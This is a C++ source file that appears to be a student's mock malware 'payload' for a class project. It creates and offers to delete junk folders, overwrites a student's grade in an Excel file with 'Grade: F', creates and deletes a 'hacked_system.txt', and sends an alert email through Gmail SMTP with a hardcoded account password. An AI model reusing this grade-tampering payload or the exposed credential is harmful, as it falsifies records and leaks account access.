#include "steven.h"
#include <stdlib.h>
#include <stdio.h>
#include <cstring>
#include <experimental/filesystem>
#include <xlnt/xlnt.hpp>
#include <curl/curl.h>
#include <bits/stdc++.h>
#include <sys/stat.h>
#include <sys/types.h>

using namespace std;
using namespace experimental::filesystem;

/*The next line defines the path of the CA cert file*/
static const char *pCACertFile = "./cacert.pem";

#define FROM    "stevenjkorvin@gmail.com"
// #define TO		"dwang@bergen.edu"
#define TO "kellyhjk0105@gmail.com"

/*The body of the email*/
static const char *payload_text[] = {
  "Date: Thur, 11 Jun 2020 21:14:29 -0500\r\n",
  "To: " TO "(David Wang)\r\n",
  "From: " FROM "(Steven Korvin)\r\n",
  "Subject: hacked_system.txt has been deleted!\r\n",
  "\r\n", /* empty line to divide headers from body, see RFC5322 */
  "hacked_system.txt has been deleted from SteveOS!\r\n",
  NULL
};

struct upload_status {
  int lines_read;
};

static size_t payload_source(void *ptr, size_t size, size_t nmemb, void *userp)
{
  struct upload_status *upload_ctx = (struct upload_status *)userp;
  const char *data;

  if((size == 0) || (nmemb == 0) || ((size*nmemb) < 1)) {
    return 0;
  }

  data = payload_text[upload_ctx->lines_read];

  if(data) {
    size_t len = strlen(data);
    memcpy(ptr, data, len);
    upload_ctx->lines_read++;

    return len;
  }

  return 0;
}

void payload()
{
    {
        /*Creates Trash directory 50 times and outputs "I have dumped folder 1, 2, 3, etc. */
        create_directory("/mnt/d/project/TrashTrashTrash");
        char buffer[255];
        for(int i = 1; i < 51; i++)
            {
                sprintf(buffer, "/mnt/d/project/TrashTrashTrash/Trash%d", i);
                create_directory(buffer);
                cout  << "I have dumped folder " << i << ".\n";
            }

        /*Gives the user a choice in having having the folders deleted or not.*/
        cout << "I have dumped 50 folders. Do you want these folders deleted? [Yes/No:] ";

        while (true)
        {
            string choice;
            cin >> choice;

            if (choice == "Yes" || choice == "yes")
            {
                cout << "The folders are removed.";
                remove("/mnt/d/project/TrashTrashTrash");
                break;
            }

            else if (choice == "No" || choice == "no")
            {

                cout << "The folders stay.";
                break;
            }

            else
            {
                (cout << "Enter Yes or No\n[Yes/No:] ");
            }
        }
    }

    /*Loads TimTimmersonGrade.xlsx and changes student's grade from A to F.*/
    {
        {
            xlnt::workbook wb;
            wb.load("./TimTimmersonGrade.xlsx");
            auto ws = wb.active_sheet();
            ws.cell("B1").value("Grade: F");
            wb.save("./TimTimmersonGrade.xlsx");}
        }

        /*Creates directory SteveOS and file hacked_system.txt*/
        {
            mkdir("/mnt/d/project/SteveOS", 0777);
            std::ofstream outfile ("/mnt/d/project/SteveOS/hacked_system.txt");
        }

        /*Removes file hacked_system.txt*/
        {
            remove("/mnt/d/project/SteveOS/hacked_system.txt");
        }

        CURL *curl;
        CURLcode res = CURLE_OK;
        struct curl_slist *recipients = NULL;
        struct upload_status upload_ctx;

        upload_ctx.lines_read = 0;


    curl = curl_easy_init();
    if(curl) {
        /*This option loads the CA cert file*/
        curl_easy_setopt(curl, CURLOPT_CAINFO, pCACertFile);

        /* This is the URL for your mailserver */
        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");

        /* Note that this option isn't strictly required, omitting it will result
        * in libcurl sending the MAIL FROM command with empty sender data. All
        * autoresponses should have an empty reverse-path, and should be directed
        * to the address in the reverse-path which triggered them. Otherwise,
        * they could cause an endless loop. See RFC 5321 Section 4.5.5 for more
        * details.
        */
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM);

        /* Add two recipients, in this particular case they correspond to the
        * To: and Cc: addressees in the header, but they could be any kind of
        * recipient. */
        recipients = curl_slist_append(recipients, TO);
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        /* We're using a callback function to specify the payload (the headers and
        * body of the message). You could just use the CURLOPT_READDATA option to
        * specify a FILE pointer to read from. */
        curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        curl_easy_setopt(curl, CURLOPT_USERNAME, "stevenjkorvin@gmail.com");
        curl_easy_setopt(curl, CURLOPT_PASSWORD, "axkhfluqdobafbea");

        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);

        /* Send the message */
        res = curl_easy_perform(curl);

        /* Check for errors */
        if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));

        /* Free the list of recipients */
        curl_slist_free_all(recipients);

        /* curl won't send the QUIT command until you call cleanup, so you should
        * be able to re-use this connection for additional messages (setting
        * CURLOPT_MAIL_FROM and CURLOPT_MAIL_RCPT as required, and calling
        * curl_easy_perform() again. It may not be a good idea to keep the
        * connection open for a very long time though (more than a few minutes
        * may result in the server timing out the connection), and you do want to
        * clean up in the end.
        */
        curl_easy_cleanup(curl);
    }
}